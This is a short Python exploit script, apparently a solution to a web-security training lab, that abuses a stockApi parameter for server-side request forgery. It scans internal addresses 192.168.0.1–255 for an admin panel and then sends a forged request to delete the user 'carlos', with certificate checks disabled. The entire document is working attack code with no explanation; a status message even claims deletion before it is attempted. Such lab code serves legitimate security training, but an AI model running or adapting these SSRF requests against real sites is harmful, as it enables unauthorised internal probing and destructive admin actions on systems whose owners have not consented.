import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxie={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
def check_admin_hostname(url):
    check_path="/product/stock"
    admin_hostname=""
    for i in range(1,256):
        hostname="http://192.168.0.%s:8080/admin" %i
        param={"stockApi":hostname}
        r=requests.post(url+check_path,data=param,verify=False,proxies=proxie)
        if r.status_code == 200:
            admin_hostname="192.168.0.%s" %i
            break

    if admin_hostname == "":
        print("error")
    return admin_hostname
def delete_user(url,admin_host):
    delete_user_ssrf_pyload='http://%s:8080/admin/delete?username=carlos' %admin_host
    check_path='/product/stock'
    param={"stockApi":delete_user_ssrf_pyload}
    r=requests.post(url+check_path,data=param,verify=False,proxies=proxie)
    # Check if user was deleted
    check_admin_url_ssrf_payload = 'http://%s:8080/admin' % admin_host
    params2 = {'stockApi': check_admin_url_ssrf_payload}
    r = requests.post(url + check_path, data=params2, verify=False, proxies=proxie)
    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user")
    else:
        print("(-) Exploit was unsuccessful.")
def main():
    if len(sys.argv) != 2:
        print("(+) usage %s <url>"% sys.argv[0])
        print("(+) example : %s www.examlpe.ma" % sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1]    
    print("finding admin hostname")
    admin_hostname=check_admin_hostname(url)
    print("founded %s",admin_hostname)
    print("user deleted")
    delete_user(url,admin_hostname)

if __name__== '__main__':
    main()
